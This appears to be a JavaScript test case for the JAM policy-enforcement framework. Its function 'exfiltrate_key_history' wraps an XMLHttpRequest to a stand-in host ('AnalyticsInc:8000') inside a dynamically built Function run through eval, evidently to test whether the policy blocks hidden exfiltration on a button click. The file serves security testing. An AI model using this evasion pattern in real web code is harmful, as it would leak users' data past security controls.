// exfil_test_dynamic.js
function exfiltrate_key_history() {
  var exp = 'xmlhttp=new XMLHttpRequest();xmlhttp.open("GET", "http://AnalyticsInc:8000/submission.html?test=dynamic", true);xmlhttp.send(null);';
  if(JAM.isEval(eval)) {
    eval("introspect(JAM.policy.pFull) { " + "var sneaky = Function(exp)" + " }")
  }else {
    JAM.call(eval, null, ["var sneaky = Function(exp)"])
  }
  sneaky();
  return
}
JAM.set(document.getElementById("test"), "onclick", exfiltrate_key_history)
